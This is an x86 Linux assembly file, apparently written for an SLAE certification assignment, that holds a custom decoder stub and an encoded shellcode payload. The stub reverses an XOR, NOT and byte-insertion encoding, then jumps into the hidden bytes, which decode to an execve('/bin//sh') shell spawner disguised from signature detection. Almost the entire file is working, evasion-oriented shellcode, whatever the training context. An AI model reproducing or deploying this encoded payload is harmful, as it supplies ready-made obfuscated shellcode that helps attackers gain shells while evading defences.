; Filename:	decoder.nasm
; Author:	aus-mate
; Purpose:	This code was written for assignment #4 of the SecurityTube Linux Assembly Expert certification.
; Student ID:	SLAE-1555

global _start

section .text
_start:
	jmp short call_decode

decoder:
	pop esi			; pop shellcode into esi
	xor ecx, ecx		; clear ecx
	mov edi, esi		; save location of esi in edi

xor_decode:
	xor byte [esi], 0xAA	; xor each byte with 0xaa to return original values
	jz save_params
	inc esi			; increment along the shellcode
	inc ecx			; increment byte counter
	jmp xor_decode		; On the last byte 0xaa exit loop

save_params:	
	mov esi, edi		; restore original position
	push ecx		; store the counter value on the stack	

not_decode:
	not byte [esi]		; not each byte
	inc esi			; increment along the shellcode
	loop not_decode		; loop counter times
	pop ecx			; restore original value of counter
		
	xor eax, eax		; clear eax
	mov al, 0x1		; move 1 into eax
	mov bl, 0x2		; move 2 into eax for multiplication
	inc edi			; set edi to the address of the first byte to be replaced

ins_decode:
	push eax		; save value of eax onto the stack
	mul bl			; multiply eax by 2
	mov dl, byte[edi + eax]	; move desired byte into dl
	mov byte[edi], dl	; move byte into correct address
	inc edi			; iterate along shellcode
	pop eax			; return value of eax
	inc eax			; increment eax
	loop ins_decode		; loop until insertions have been removed
	jmp shellcode		; return control to decoded shellcode


call_decode:

	call decoder
	shellcode: db 0x64,0x04,0x16,0x95,0x04,0x16,0x05,0x04,0x16,0x3d,0x04,0x16,0x7a,0x04,0x16,0x7a,0x04,0x16,0x26,0x04,0x16,0x3d,0x04,0x16,0x3d,0x04,0x16,0x7a,0x04,0x16,0x37,0x04,0x16,0x3c,0x04,0x16,0x3b,0x04,0x16,0xdc,0x04,0x16,0xb6,0x04,0x16,0x05,0x04,0x16,0xdc,0x04,0x16,0xb7,0x04,0x16,0x06,0x04,0x16,0xdc,0x04,0x16,0xb4,0x04,0x16,0xe5,0x04,0x16,0x5e,0x04,0x16,0x98,0x04,0x16,0xd5,0x04,0x16,0xaa
